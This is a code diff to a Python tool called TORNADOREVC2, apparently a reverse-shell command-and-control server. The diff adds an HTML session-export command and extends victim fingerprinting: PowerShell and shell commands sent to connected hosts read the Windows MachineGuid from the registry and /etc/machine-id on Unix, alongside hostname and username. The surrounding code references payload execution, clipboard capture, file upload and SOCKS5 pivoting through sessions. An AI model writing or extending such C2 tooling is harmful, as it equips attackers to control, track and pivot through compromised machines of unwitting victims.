@@ -32,6 +32,7 @@ from .constants import (
     XFER_MARK_START,
 )
 from .clipboard import ClipboardManager
+from .export import SessionExporter
 from .payloads import get_payloads
 from .payload_exec import PayloadExecutor
 from .session_log import SessionLogger
@@ -62,6 +63,7 @@ class TORNADOREVC2:
         self.payload_exec = PayloadExecutor(self)
         self.clipboard = ClipboardManager(self)
         self.tunnels = TunnelManager(self)
+        self.exporter = SessionExporter(self)
         self.registry = SessionRegistry()
         self.colors = {
             'cyan': '\033[96m', 'green': '\033[92m', 'yellow': '\033[93m',
@@ -690,10 +692,12 @@ class TORNADOREVC2:
         return "unknown"
 
     def _probe_identity(self, client_sock, shell_type):
-        """Collect hostname and username for stable session fingerprinting."""
+        """Collect hostname, username, and machine ID for session fingerprinting."""
         if shell_type == 'windows':
             win_ps = (
-                f"'{IDENT_MARK_START}'+$env:COMPUTERNAME+'|'+$env:USERNAME+'{IDENT_MARK_END}'"
+                f"$g=(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Cryptography' "
+                f"-ErrorAction SilentlyContinue).MachineGuid;"
+                f"'{IDENT_MARK_START}'+$env:COMPUTERNAME+'|'+$env:USERNAME+'|'+$g+'{IDENT_MARK_END}'"
             )
             payload = self._run_marked(
                 client_sock, '', win_ps, 'windows', timeout=8.0,
@@ -702,9 +706,11 @@ class TORNADOREVC2:
         elif shell_type == 'unix':
             unix_cmd = (
                 f"printf '%s' '{IDENT_MARK_START}'; "
-                f"printf '%s|%s' "
+                f"printf '%s|%s|' "
                 f"\"$(hostname 2>/dev/null | head -1 | tr -d '\\r\\n')\" "
                 f"\"$(id -un 2>/dev/null || whoami 2>/dev/null | tr -d '\\r\\n')\"; "
+                f"tr -d '\\n' </etc/machine-id 2>/dev/null || "
+                f"tr -d '\\n' </var/lib/dbus/machine-id 2>/dev/null; "
                 f"printf '%s' '{IDENT_MARK_END}'"
             )
             payload = self._run_marked(
@@ -720,13 +726,16 @@ class TORNADOREVC2:
 
         if not payload or '|' not in payload:
             return {}
-        host, user = payload.split('|', 1)
-        user = user.strip().split('\\')[-1]
+        parts = payload.split('|')
+        host = parts[0].strip() if len(parts) > 0 else ''
+        user = parts[1].strip().split('\\')[-1] if len(parts) > 1 else ''
+        machine_id = parts[2].strip() if len(parts) > 2 else ''
         identity = {
-            'hostname': host.strip(),
-            'username': user.strip(),
+            'hostname': host,
+            'username': user,
+            'machine_id': machine_id.replace('{', '').replace('}', '').lower(),
         }
-        if identity['hostname'] or identity['username']:
+        if identity['hostname'] or identity['username'] or identity['machine_id']:
             return identity
         return {}
 
@@ -1001,6 +1010,8 @@ class TORNADOREVC2:
                         self.clipboard.handle_command(client_sock, ['clipboard'])
                     except ValueError:
                         print(f"{self.colors['red']}Invalid ID{self.colors['end']}")
+                elif self.exporter.handle_command(cmd_parts):
+                    pass
                 elif self.tunnels.handle_main_command(cmd_parts):
                     pass
                 elif cmd_lower == 'upload':
@@ -1055,6 +1066,9 @@ class TORNADOREVC2:
     clear/cls               Clear screen
     help                    This help menu
     exit/quit               Shutdown server
+
+    {self.colors['green']}REPORTING:{self.colors['end']}
+    export <ID>                                              Export HTML session transcript
 
     {self.colors['green']}INTERNAL PIVOTING (SOCKS5):{self.colors['end']}
     socks <ID> <listen_port>                                 SOCKS5 proxy via session
